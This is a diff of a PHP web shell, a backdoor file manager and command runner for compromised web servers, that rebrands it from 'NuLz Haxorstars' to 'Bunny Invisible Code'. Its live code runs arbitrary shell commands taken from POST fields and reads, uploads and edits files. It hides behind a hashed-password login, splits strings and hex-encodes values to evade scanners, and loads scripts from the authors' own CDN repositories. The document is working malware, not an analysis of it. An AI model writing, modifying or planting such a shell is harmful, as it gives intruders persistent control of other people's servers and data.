@@ -119,7 +119,7 @@ function deleteFile($fileName) {
         return false;
     }
 }
-function NuLzCmd($komendnya) {
+function BunnyCmd($komendnya) {
     global $hayoloh;
     global $fw;
     global $fc;
@@ -192,11 +192,11 @@ function NuLzCmd($komendnya) {
         return 'The F'.'un'.'ct'.'io'.'n T'.'o R'.'u'.'n The C'.'om'.'ma'.'nd I'.'s Di'.'sa'.'bl'.'e On T'.'h'.'is Se'.'rv'.'er';
     }
 }
-if (isset($_POST['nulz'])) {
-    $komendnya = $_POST['nulz'];
-    echo NuLzCmd($komendnya);
+if (isset($_POST['BIC0de'])) {
+    $komendnya = $_POST['BIC0de'];
+    echo BunnyCmd($komendnya);
 }
-function NuLzReadFile($this_file)
+function BunnyReadFile($this_file)
 {
     global $hayoloh;
     global $func_exist;
@@ -212,7 +212,7 @@ function NuLzReadFile($this_file)
         if ($fi_le) {
             $headers = get_headers($this_file);
             if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
-                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
+                $content = BunnyCmd('cat "' . addslashes($this_file) . '"');
             }
             while (!feof($fi_le)) {
                 $content .= $fr($fi_le, 8192);
@@ -228,7 +228,7 @@ function NuLzReadFile($this_file)
         if ($content) {
             $headers = get_headers($this_file);
             if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
-                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
+                $content = BunnyCmd('cat "' . addslashes($this_file) . '"');
             }
             return $content;
         } else {
@@ -241,11 +241,11 @@ function NuLzReadFile($this_file)
     }
 }
 
-/*NuLz Haxorstars*/
+/*Bunny Invisible Code*/
 $s_he_ll_Name = "\x42\x75\x6e\x6e\x79\x20\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x20\x43\x6f\x64\x65";
-$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x70\x6e\x67";
-$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x69\x63\x6f";
-function NuLzCwd(){
+$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x62\x6d\x2e\x6a\x70\x67";
+$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x62\x6d\x2e\x6a\x70\x67";
+function BunnyCwd(){
     global $cw;
     global $func_exist;
     global $d_name;
@@ -255,7 +255,7 @@ function NuLzCwd(){
 		return $d_name($_SERVER["SCRIPT_FILENAME"]);
 	}
 }
-function NuLzUname() {
+function BunnyUname() {
     global $func_exist;
     global $u_n_a_me;
     $u_n_a_me_disable = '<font class="font-ubuntu-mono font-green"> Ca'.'nt'.' R'.'ea'.'d Th'.'e Ke'.'rn'.'el'.'! Th'.'e F'.'u'.'nc'.'ti'.'o'.'n '.$u_n_a_me.'() is Di'.'sa'.'bl'.'ed'.'! </font>';
@@ -445,10 +445,10 @@ $this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HO
 $fontawesome_pro_version = 'v6.5.1'; //change if updated to new version
 $fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';
 /*Framework - Uikit*/
-$uikit_css = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit.min.css';
-$uikit_rtl = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit-rtl.min.css';
-$uikit_js = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit.min.jss';
-$uikit_icon = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit-icons.min.js';
+$uikit_css = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/uikit.min.css";
+$uikit_rtl = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/uikit-rtl.min.css";
+$uikit_js = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/uikit.min.js";
+$uikit_icon = "https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/uikit-icons.min.js";
 /*Jquery - Ajax*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
@@ -456,7 +456,7 @@ $ajax_version = '3.5.1';
 $ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/'.$ajax_version.'/jquery.min.js';
 /*Login Page*/
 //login
-$passwd = '6'.'3'.'1'.'1'.'c'.'c'.'1'.'f'.'f'.'7'.'4'.'d'.'3'.'5'.'e'.'c'.'1'.'8'.'d'.'2'.'6'.'8'.'0'.'9'.'2'.'b'.'0'.'3'.'3'.'4'.'4'.'2'.'0'.'e'.'d'.'f'.'a'.'1'.'0'.'1';
+$passwd = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
@@ -464,7 +464,7 @@ if (isset($_POST['gasken'])) {
         $_SESSION["login"] = "login";
         setcookie('logined', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Y"."ou "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Go "."A"."w"."a"."y "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
     }
 }
 if (isset($_GET['logout'])) {
@@ -491,18 +491,17 @@ if (empty($_SESSION['login'])) {
 <button type="submit" name="gasken" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/haxorstars/archive@main/nulz-mini/nulz-verification.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/bunny.js"></script>
 </body></html>
 <?php
         exit();
     }
 }
-//NuLz Ganteng? yoi jelas dong
 if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
 } else {
-    $path = NuLzCwd();
+    $path = BunnyCwd();
 }
 $path = str_replace("\\", "/", $path);
 ?>
@@ -536,18 +535,18 @@ $path = str_replace("\\", "/", $path);
     }
     </script>
     <!-- Custom Css -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/nulz-mini/nulz-custom.css" media="all">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/Bunny.css" media="all">
 </head>
 
 <body>
     <header class="uk-width-1-1" style="background: var(--gray-900);">
         <div class="uk-margin-small-left">
-            <div class="nulz-ganteng uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
+            <div class="bunny-ganteng uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
                 <img style="width: 5vh; border-radius: 5px;" src="<?=$s_he_ll_Logo?>" alt="<?=$s_he_ll_Name?>">
                 <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$s_he_ll_Name?></span>
             </div>
-            <div class="nulz-sysinfo uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
-            <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=NuLzUname();?></span>
+            <div class="bunny-sysinfo uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
+            <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=BunnyUname();?></span>
             <span class="font-bold"><?='ID'.'('.'Us'.'er'.'/'.'G'.'ro'.'u'.'p)'?>: <font class="font-green font-ubuntu-mono">uid=<?=$uid?>(<?=$user?>)&nbsp;gid=<?=$gid?>(<?=$group?>)</font></span>
             <span class="font-bold"><?='Se'.'r'.'v'.'er '.'I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=serverIp()?></font></span>
             <span class="font-bold"><?='Yo'.'u'.'r I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=userIp()?></font></span>
@@ -577,7 +576,7 @@ $path = str_replace("\\", "/", $path);
     </div>
     </header>
 
-    <div class="nulz-tools uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
+    <div class="bunny-tools uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
         <div class="tools-upload">
             <form action="" method="POST" enctype="multipart/form-data" class="form-tools uk-form-horizontal uk-margin uk-padding-small font-protest-riot">
                 <input type="file" name="file[]" onchange="this.form.submit()" multiple>
@@ -842,7 +841,7 @@ $path = str_replace("\\", "/", $path);
                             <input class="uk-input font-poppins" name="newfi'.'l'.'es'.'na'.'me" type="text" placeholder="fi'.'le'.'na'.'me.'.'t'.'x'.'t" aria-label="Input">
                         </div>
                         <div class="uk-margin">
-                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="NuLz Was Here!" aria-label="Textarea"></textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Bunny Invisible Code Here!" aria-label="Textarea"></textarea>
                         </div>
                     </fieldset>
                 </form>
@@ -912,7 +911,7 @@ $path = str_replace("\\", "/", $path);
                         </div>
                         <div>';
                         if (isset($_POST['btn-cmd'])) {
-                            echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.NuLzCmd($_POST["komendnya"]).'</textarea>';
+                            echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.BunnyCmd($_POST["komendnya"]).'</textarea>';
                         }
                 echo '</div>
                     </fieldset>
@@ -971,7 +970,7 @@ $path = str_replace("\\", "/", $path);
                         <legend class="uk-legend font-bold font-protest-riot">Edit Files</legend>
                         <p class="font-teal">'.$path.'/'.$this_file.'</p>
                         <div class="uk-margin">
-                            <textarea style="background: var(--gray-950); color: var(--emerald-500);" class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea">'.$hayoloh(NuLzReadFile($this_file)).'</textarea>
+                            <textarea style="background: var(--gray-950); color: var(--emerald-500);" class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea">'.$hayoloh(BunnyReadFile($this_file)).'</textarea>
                         </div>
                     </fieldset>
                 </form>
@@ -1118,7 +1117,7 @@ $path = str_replace("\\", "/", $path);
         ?>
         <div class="uk-overflow-auto uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
             <form action="" method="POST" enctype="multipart/form-data" class="uk-width-1-1">
-                <table class="nulz-table uk-width-1-1">
+                <table class="bunny-table uk-width-1-1">
                     <thead>
                         <tr>
                             <th>Select All<br><input type="checkbox" id="checkall" class="checkall" name="checkall" aria-label="Checkbox"></th>
@@ -1132,13 +1131,13 @@ $path = str_replace("\\", "/", $path);
                     </thead>
                     <tbody>
                         <tr>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'B'.'I'.'C'.'-'?></td>
                             <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
                         </tr>
                         <?php
                         foreach ($scan as $dir) {
@@ -1287,7 +1286,7 @@ $path = str_replace("\\", "/", $path);
     <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
     <!-- Hadehh lammer kang recode, tinggal pake doang malah di recode -->
         <div class="footer-content uk-padding-small">
-            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://github.com/haxorstars">NuLz Haxorstars</a></span>
+            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/BunnyInvisible404">Bunnyman404</a></span>
         </div>
     </div>
     <script src="<?=$uikit_js?>"></script>
